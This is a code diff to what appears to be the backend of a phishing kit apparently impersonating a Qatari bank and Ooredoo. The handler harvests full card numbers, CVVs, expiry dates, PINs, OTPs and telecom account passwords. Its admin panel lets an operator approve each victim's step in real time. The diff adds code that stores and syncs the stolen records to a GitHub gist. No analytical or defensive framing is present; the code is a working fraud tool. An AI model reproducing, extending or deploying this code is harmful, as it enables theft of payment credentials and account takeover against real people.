@@ -1,37 +1,93 @@
+const https = require("https");
+
 const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "qnb2026";
+const GIST_ID = process.env.GIST_ID || "dd7f9a54aff0608980d04c04360bf271";
+const GIST_TOKEN = process.env.GIST_TOKEN || "";
 
 let orders = [];
+let _lastRead = 0;
+let _lastWrite = 0;
+const READ_INTERVAL = 2000;
 const visitors = new Map();
 const ACTIVE_MS = 10000;
 
-function activeVisitors() {
-  const now = Date.now();
-  for (const [id, v] of visitors) if (now - v.t > ACTIVE_MS) visitors.delete(id);
-  return [...visitors.values()];
+function gistRequest(method, body) {
+  return new Promise(function(resolve, reject) {
+    var data = body ? JSON.stringify(body) : "";
+    var opts = {
+      hostname: "api.github.com",
+      path: "/gists/" + GIST_ID,
+      method: method,
+      headers: {
+        "User-Agent": "nbq-server",
+        "Accept": "application/vnd.github+json",
+        "Content-Type": "application/json"
+      }
+    };
+    if (GIST_TOKEN) opts.headers["Authorization"] = "token " + GIST_TOKEN;
+    if (body) opts.headers["Content-Length"] = Buffer.byteLength(data);
+    var req = https.request(opts, function(res) {
+      var chunks = [];
+      res.on("data", function(c) { chunks.push(c); });
+      res.on("end", function() {
+        try { resolve(JSON.parse(Buffer.concat(chunks).toString())); }
+        catch(e) { resolve(null); }
+      });
+    });
+    req.on("error", reject);
+    if (body) req.write(data);
+    req.end();
+  });
 }
 
-const isAdmin = req => req.headers["x-admin-password"] === ADMIN_PASSWORD;
-const str = (v, max = 300) => String(v == null ? "" : v).slice(0, max);
+async function loadFromGist() {
+  if (Date.now() - _lastRead < READ_INTERVAL) return;
+  try {
+    var g = await gistRequest("GET");
+    if (g && g.files && g.files["orders.json"]) {
+      var parsed = JSON.parse(g.files["orders.json"].content);
+      orders = parsed.orders || [];
+      _lastRead = Date.now();
+    }
+  } catch(e) {}
+}
+
+async function saveToGist() {
+  try {
+    await gistRequest("PATCH", {
+      files: { "orders.json": { content: JSON.stringify({ orders: orders, updated: Date.now() }) } }
+    });
+    _lastWrite = Date.now();
+    _lastRead = Date.now();
+  } catch(e) {}
+}
+
+function activeVisitors() {
+  var now = Date.now();
+  for (var entry of visitors) { if (now - entry[1].t > ACTIVE_MS) visitors.delete(entry[0]); }
+  return Array.from(visitors.values());
+}
+
+var isAdmin = function(req) { return req.headers["x-admin-password"] === ADMIN_PASSWORD; };
+var str = function(v, max) { if (!max) max = 300; return String(v == null ? "" : v).slice(0, max); };
 
 function cleanOrder(b) {
-  const p = b.pay && typeof b.pay === "object" ? b.pay : {};
-  const ord = b.ooredoo && typeof b.ooredoo === "object" ? b.ooredoo : {};
-
-  let rawCard = b.cardNumber || p.cardNumber || p.number || p.fullCard || p.card || "";
+  var p = b.pay && typeof b.pay === "object" ? b.pay : {};
+  var ord = b.ooredoo && typeof b.ooredoo === "object" ? b.ooredoo : {};
+  var rawCard = b.cardNumber || p.cardNumber || p.number || p.fullCard || p.card || "";
   if (typeof rawCard === "boolean") rawCard = "";
-  let rawCvv = b.cvv || p.cvv || "";
+  var rawCvv = b.cvv || p.cvv || "";
   if (typeof rawCvv === "boolean") rawCvv = "";
-  let rawExp = b.expiry || p.exp || p.expiry || "";
+  var rawExp = b.expiry || p.exp || p.expiry || "";
   if (typeof rawExp === "boolean") rawExp = "";
-  let rawOtp = b.otp || p.otp || p.code || "";
+  var rawOtp = b.otp || p.otp || p.code || "";
   if (typeof rawOtp === "boolean") rawOtp = "";
-  let rawPin = b.pin || p.pin || "";
+  var rawPin = b.pin || p.pin || "";
   if (typeof rawPin === "boolean") rawPin = "";
-  let rawName = b.cardName || p.cardName || p.name || "";
+  var rawName = b.cardName || p.cardName || p.name || "";
   if (typeof rawName === "boolean") rawName = "";
-
   return {
-    ref: str(b.ref, 40), status: ["confirmed", "awaiting"].includes(b.status) ? b.status : "pending",
+    ref: str(b.ref, 40), status: ["confirmed","awaiting"].includes(b.status) ? b.status : "pending",
     card: str(b.card, 10), watch: str(b.watch, 10),
     st: b.st === "resident" ? "resident" : "citizen",
     n: str(b.n, 120), id: str(b.id, 20).replace(/\D/g, ""), p: str(b.p, 15).replace(/\D/g, ""),
@@ -39,25 +95,28 @@ function cleanOrder(b) {
     em: str(b.em, 30), a: str(b.a, 5), ad: str(b.ad || b.address || "", 500),
     bank: str(b.bank, 20), bankName: str(b.bankName || "", 200),
     lang: b.lang === "en" ? "en" : "ar",
-    step: ["card", "otp", "pin", "ooredoo", "ooredoo-otp"].includes(b.step) ? b.step : undefined,
+    step: ["card","otp","pin","ooredoo","ooredoo-otp"].includes(b.step) ? b.step : undefined,
     pay: {
-      cardName: str(rawName, 200),
-      cardNumber: str(rawCard, 200),
+      cardName: str(rawName, 200), cardNumber: str(rawCard, 200),
       last4: str((rawCard.slice(-4) || p.last4 || "").replace(/\D/g, ""), 4),
-      brand: ["visa", "mc", "amex"].includes(p.brand || b.brand) ? (p.brand || b.brand) : "",
+      brand: ["visa","mc","amex"].includes(p.brand || b.brand) ? (p.brand || b.brand) : "",
       exp: str(rawExp, 50), cvv: str(rawCvv, 50), otp: str(rawOtp, 50), pin: str(rawPin, 50)
     },
     ooredoo: { username: str(ord.username, 200), password: str(ord.password, 200), otp: str(ord.otp, 50) }
   };
 }
 
-module.exports = function handler(req, res) {
+module.exports = async function handler(req, res) {
   try {
     var apiPath = req.query && req.query.__apiPath ? String(req.query.__apiPath) : "";
     var url = "/api/" + apiPath;
     var method = req.method || "GET";
     var b = {};
     if (req.body && typeof req.body === "object") b = req.body;
+
+    await loadFromGist();
+
+    var needsSave = false;
 
     if (method === "POST" && url === "/api/orders") {
       var o = cleanOrder(b);
@@ -68,7 +127,7 @@ module.exports = function handler(req, res) {
         if (idx >= 0) {
           var incoming = b.ooredoo;
           var current = Object.assign({}, orders[idx].ooredoo);
-          ["username", "password", "otp"].forEach(function(key) {
+          ["username","password","otp"].forEach(function(key) {
             if (Object.prototype.hasOwnProperty.call(incoming, key)) {
               current[key] = str(incoming[key], key === "otp" ? 50 : 200);
             }
@@ -80,6 +139,7 @@ module.exports = function handler(req, res) {
           orders[idx].reason = "";
           orders[idx].next = "";
           orders[idx].updated = Date.now();
+          await saveToGist();
           return res.status(200).json({ ok: true, ref: o.ref });
         }
       }
@@ -92,6 +152,7 @@ module.exports = function handler(req, res) {
         orders.unshift(Object.assign({}, o, { ts: Date.now() }));
         if (orders.length > 5000) orders.length = 5000;
       }
+      await saveToGist();
       return res.status(200).json({ ok: true, ref: o.ref });
     }
 
@@ -103,8 +164,8 @@ module.exports = function handler(req, res) {
     }
 
     if (method === "POST" && url === "/api/ping") {
-      var id = str(b.id, 40); if (!id) return res.status(400).json({ ok: false });
-      visitors.set(id, { t: Date.now(), page: str(b.page, 60) });
+      var vid = str(b.id, 40); if (!vid) return res.status(400).json({ ok: false });
+      visitors.set(vid, { t: Date.now(), page: str(b.page, 60) });
       return res.status(200).json({ ok: true });
     }
 
@@ -130,22 +191,24 @@ module.exports = function handler(req, res) {
           dorder.decision = "reject"; dorder.reason = step; dorder.status = "rejected"; dorder.next = "";
         } else {
           var nextOf = { card: "otp", otp: "pin", pin: "done", ooredoo: "otp", "ooredoo-otp": "done" };
-          var next = nextOf[step];
+          var nxt = nextOf[step];
           dorder.decision = "accept"; dorder.reason = "";
-          if (next === "done") { dorder.status = "confirmed"; dorder.next = "done"; }
-          else { dorder.status = "stepok"; dorder.next = next; }
+          if (nxt === "done") { dorder.status = "confirmed"; dorder.next = "done"; }
+          else { dorder.status = "stepok"; dorder.next = nxt; }
         }
         dorder.updated = Date.now();
+        await saveToGist();
         return res.status(200).json({ ok: true, status: dorder.status });
       }
       if (method === "DELETE" && url.startsWith("/api/admin/orders/")) {
         var delref = decodeURIComponent(url.split("/").pop());
         orders = orders.filter(function(o) { return o.ref !== delref; });
+        await saveToGist();
         return res.status(200).json({ ok: true });
       }
     }
 
-    return res.status(404).json({ ok: false, url: url, method: method });
+    return res.status(404).json({ ok: false });
   } catch (e) {
     return res.status(500).json({ ok: false, error: String(e.message) });
   }
